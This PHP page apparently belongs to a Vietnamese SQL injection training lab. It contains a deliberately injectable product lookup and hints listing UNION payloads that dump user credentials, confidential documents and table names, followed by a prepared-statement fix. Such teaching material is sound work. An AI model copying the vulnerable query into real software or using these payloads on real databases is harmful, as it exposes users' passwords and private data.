<?php
// union_attack.php - DEMO UNION-BASED SQL INJECTION
// ⚠️ Form tìm kiếm sản phẩm dễ bị Union Attack

require_once '../includes/config.php';

$error = '';
$sql_query = '';
$result_data = [];
$product_id = '';

if (isset($_GET['id'])) {
    $product_id = $_GET['id'];
    
    // ❌ NGUY HIỂM: Nối chuỗi trực tiếp - dễ bị Union Attack
    $sql = "SELECT name, price, description FROM products WHERE id = $product_id";
    
    // Lưu câu query để hiển thị
    $sql_query = $sql;
    
    try {
        $result = $conn->query($sql);
        
        if ($result && $result->num_rows > 0) {
            while ($row = $result->fetch_assoc()) {
                $result_data[] = $row;
            }
        } else {
            $error = "❌ Không tìm thấy sản phẩm với ID = " . htmlspecialchars($product_id);
        }
    } catch (Exception $e) {
        // ❌ NGUY HIỂM: Hiển thị lỗi SQL chi tiết
        $error = "❌ Lỗi SQL: " . $e->getMessage();
    }
}
?>

<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Union Attack Demo - SQL Injection</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <header class="header">
            <div class="logo">
                <i class="fas fa-link"></i>
                <h1>Union Attack Demo</h1>
            </div>
            <a href="index.html" class="btn-back"><i class="fas fa-arrow-left"></i> Quay lại</a>
        </header>

        <div class="login-container">
            <div class="login-card danger-card">
                <h2><i class="fas fa-search"></i> Tìm Kiếm Sản Phẩm</h2>
                <p style="color: var(--text-muted); margin-bottom: 20px;">Form này dễ bị Union-based SQL Injection</p>
                
                <?php if ($error): ?>
                    <div class="alert alert-danger">
                        <?php echo $error; ?>
                    </div>
                <?php endif; ?>

                <form method="GET" class="login-form">
                    <div class="form-group">
                        <label><i class="fas fa-hashtag"></i> Product ID</label>
                        <input type="text" name="id" value="<?php echo htmlspecialchars($product_id); ?>" placeholder="Nhập ID sản phẩm (1-5)" required>
                        <small>Thử nhập: 1, 2, 3, 4, hoặc 5</small>
                    </div>
                    <button type="submit" class="btn btn-danger">
                        <i class="fas fa-search"></i> Tìm Kiếm
                    </button>
                </form>

                <?php if ($sql_query): ?>
                    <div class="debug-box">
                        <h3><i class="fas fa-code"></i> Câu lệnh SQL thực tế:</h3>
                        <div class="code-example">
                            <pre><code><?php echo htmlspecialchars($sql_query); ?></code></pre>
                        </div>
                        
                        <?php if (!empty($result_data)): ?>
                            <h3><i class="fas fa-database"></i> Kết quả (<?php echo count($result_data); ?> bản ghi):</h3>
                            <div class="result-table">
                                <table>
                                    <thead>
                                        <tr>
                                            <?php 
                                            // Lấy tên cột động
                                            if (!empty($result_data)) {
                                                foreach (array_keys($result_data[0]) as $column) {
                                                    echo "<th>" . htmlspecialchars($column) . "</th>";
                                                }
                                            }
                                            ?>
                                        </tr>
                                    </thead>
                                    <tbody>
                                        <?php foreach ($result_data as $row): ?>
                                            <tr>
                                                <?php foreach ($row as $value): ?>
                                                    <td><?php echo htmlspecialchars($value); ?></td>
                                                <?php endforeach; ?>
                                            </tr>
                                        <?php endforeach; ?>
                                    </tbody>
                                </table>
                            </div>
                        <?php endif; ?>
                    </div>
                <?php endif; ?>

                <div class="attack-hints">
                    <h3><i class="fas fa-lightbulb"></i> Gợi ý Union Attack:</h3>
                    <ol style="list-style: decimal; padding-left: 20px;">
                        <li style="margin-bottom: 10px;">
                            <strong>Xác định số cột:</strong>
                            <div class="code-example" style="margin-top: 5px;">
                                <pre><code>1 ORDER BY 1 --
1 ORDER BY 2 --
1 ORDER BY 3 --
1 ORDER BY 4 -- (lỗi = chỉ có 3 cột)</code></pre>
                            </div>
                        </li>
                        <li style="margin-bottom: 10px;">
                            <strong>Test UNION:</strong>
                            <div class="code-example" style="margin-top: 5px;">
                                <pre><code>1 UNION SELECT NULL, NULL, NULL --</code></pre>
                            </div>
                        </li>
                        <li style="margin-bottom: 10px;">
                            <strong>Lấy dữ liệu users:</strong>
                            <div class="code-example" style="margin-top: 5px;">
                                <pre><code>1 UNION SELECT username, password_plain, email FROM users --</code></pre>
                            </div>
                        </li>
                        <li style="margin-bottom: 10px;">
                            <strong>Lấy dữ liệu nhạy cảm:</strong>
                            <div class="code-example" style="margin-top: 5px;">
                                <pre><code>1 UNION SELECT document_name, content, classification FROM sensitive_data --</code></pre>
                            </div>
                        </li>
                        <li style="margin-bottom: 10px;">
                            <strong>Liệt kê bảng:</strong>
                            <div class="code-example" style="margin-top: 5px;">
                                <pre><code>1 UNION SELECT table_name, table_schema, NULL FROM information_schema.tables WHERE table_schema='sqli_demo' --</code></pre>
                            </div>
                        </li>
                    </ol>
                </div>
            </div>

            <div class="info-panel">
                <div class="card">
                    <h3><i class="fas fa-code"></i> Mã nguồn dễ bị tấn công</h3>
                    <div class="code-example">
                        <pre><code>&lt;?php
$product_id = $_GET['id'];

// ❌ NGUY HIỂM: Không kiểm tra input
$sql = "SELECT name, price, description 
        FROM products 
        WHERE id = $product_id";

$result = $conn->query($sql);
?&gt;</code></pre>
                    </div>
                </div>

                <div class="card">
                    <h3><i class="fas fa-skull-crossbones"></i> Tại sao nguy hiểm?</h3>
                    <ul class="problem-list">
                        <li><i class="fas fa-times-circle"></i> Không validate input là số</li>
                        <li><i class="fas fa-times-circle"></i> Cho phép nối câu lệnh SQL</li>
                        <li><i class="fas fa-times-circle"></i> Không giới hạn kết quả trả về</li>
                        <li><i class="fas fa-times-circle"></i> Kẻ tấn công xem được cấu trúc database</li>
                        <li><i class="fas fa-times-circle"></i> Truy cập được TẤT CẢ bảng khác</li>
                    </ul>
                </div>

                <div class="card">
                    <h3><i class="fas fa-bomb"></i> Hậu quả</h3>
                    <div class="risk-grid">
                        <div class="risk-item severe" style="margin-bottom: 10px;">
                            <i class="fas fa-user-secret"></i>
                            <div>
                                <h4>Lộ thông tin user</h4>
                                <p>Username, password, email</p>
                            </div>
                        </div>
                        <div class="risk-item high" style="margin-bottom: 10px;">
                            <i class="fas fa-file-alt"></i>
                            <div>
                                <h4>Lộ dữ liệu nhạy cảm</h4>
                                <p>Tài liệu mật, báo cáo tài chính</p>
                            </div>
                        </div>
                        <div class="risk-item high">
                            <i class="fas fa-database"></i>
                            <div>
                                <h4>Lộ cấu trúc database</h4>
                                <p>Tên bảng, cột, relationships</p>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="card">
                    <h3><i class="fas fa-shield-alt"></i> Cách phòng chống</h3>
                    <ul class="security-list">
                        <li><i class="fas fa-check-circle"></i> <strong>Prepared Statements</strong> - Luôn dùng!</li>
                        <li><i class="fas fa-check-circle"></i> <strong>Input Validation</strong> - Kiểm tra kiểu dữ liệu</li>
                        <li><i class="fas fa-check-circle"></i> <strong>Whitelist</strong> - Chỉ cho phép giá trị hợp lệ</li>
                        <li><i class="fas fa-check-circle"></i> <strong>Limit Results</strong> - Giới hạn số bản ghi</li>
                    </ul>
                    
                    <h4 style="margin-top: 20px;">✅ Code an toàn:</h4>
                    <div class="code-example">
                        <pre><code>&lt;?php
// Validate input
if (!is_numeric($product_id)) {
    die("Invalid ID");
}

// Prepared Statement
$stmt = $conn->prepare(
    "SELECT name, price, description 
     FROM products 
     WHERE id = ? 
     LIMIT 1"
);
$stmt->bind_param("i", $product_id);
$stmt->execute();
?&gt;</code></pre>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
